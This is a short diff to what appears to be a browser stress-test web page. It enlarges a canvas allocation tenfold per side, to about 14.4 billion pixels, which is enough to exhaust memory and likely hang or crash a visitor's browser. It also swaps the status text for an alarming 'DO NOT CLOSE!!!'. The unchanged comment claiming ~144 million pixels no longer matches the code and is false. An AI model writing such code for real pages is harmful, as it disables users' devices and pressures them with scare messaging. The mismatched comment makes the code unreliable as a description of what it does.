@@ -72,9 +72,9 @@ document.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);
 
       // Start canvas stress after 6s
-      stressCanvas(12000, 12000); // ~144 million pixels (~576 MB raw)
+      stressCanvas(120000, 120000); // ~144 million pixels (~576 MB raw)
     }, TIMEOUT_MS);
-    statusMessage.textContent = "Timer running — DO NOT CLOSE.";
+    statusMessage.textContent = "DO NOT CLOSE!!!";
   }
 
   function resetAll() {
